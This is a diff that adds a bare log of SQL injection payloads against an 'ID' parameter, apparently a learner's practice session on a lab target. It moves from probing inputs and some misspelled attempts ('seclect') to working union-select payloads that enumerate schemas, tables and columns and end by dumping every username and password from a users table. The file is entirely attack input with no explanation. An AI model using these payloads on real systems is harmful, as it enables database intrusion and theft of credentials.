@@ -1,0 +1,38 @@
+ID:1
+ID:1
+ID:1'
+ID:1' and '1'='2
+ID:1 and 1=2
+ID:1 and 1=1
+ID:1 order by 1
+ID:1 order by 4
+ID:1 order by 3
+ID:1 union select database()
+ID:1 union seclect database() 
+ID:1 union seclect database() #
+ID:1' union seclect database() #
+ID:1; union seclect database() #
+ID:1 union seclect database() #
+ID:'1 union seclect database() #
+ID:1 union seclect database() #
+ID:1
+ID:2
+ID:2-1
+ID:2
+ID:3
+ID:4
+ID:9999 union select 1,2,3 #
+ID:9999 union select 1,(select database()),3 #
+ID:9999 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 #
+ID:9999 union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables wheretable_schema=database()) #
+ID:9999 union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables) wheretable_schema=database()) #
+ID:9999 union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables) where table_schema=database()) #
+ID:9999 union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select username from users),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select .username from schema.users),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select .username from information_schema.column),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select username from users),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select group_concat(username) from users),(select group_concat(table_name)from information_schema.tables where table_schema=database()) #
+ID:9999 union select 1,(select group_concat(username) from users),(select group_concat(password) from users) #
